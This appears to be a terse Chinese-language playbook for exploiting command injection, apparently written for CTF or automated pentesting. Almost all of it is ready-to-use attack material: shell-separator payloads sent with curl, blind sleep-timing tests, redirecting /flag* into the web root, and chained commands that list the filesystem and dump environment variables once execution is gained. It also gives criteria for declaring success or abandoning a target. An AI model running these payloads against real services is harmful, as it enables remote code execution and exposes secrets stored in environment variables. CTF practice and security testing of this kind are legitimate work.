# cmdi 命令注入

适用：ping/traceroute/dns 查询/报表生成/资产搜索等「输入会被拼进系统命令」的功能。

打法：
- 分隔符矩阵一条命令打完（分号 竖反引 $() ）：
  curl -d "host=127.0.0.1;id" ...；再试 `id`、$(id)、%0aid、|id、&&id、||id
- 回显无果试盲打：127.0.0.1;sleep 3 看响应时长；或外带不可用时写文件再读：
  ;cat /flag* > /var/www/html/out.txt 然后访问 /out.txt。
- 拿到执行先 ls / 、cat /flag*、env，一次列全：
  ;ls -la /;cat /flag* 2>/dev/null;env

判定：uid=/flag{ 出现 → fact(kind=rce) + 证据落盘 + finding。

停止：所有分隔符无差异且时长无变化，标 dead。
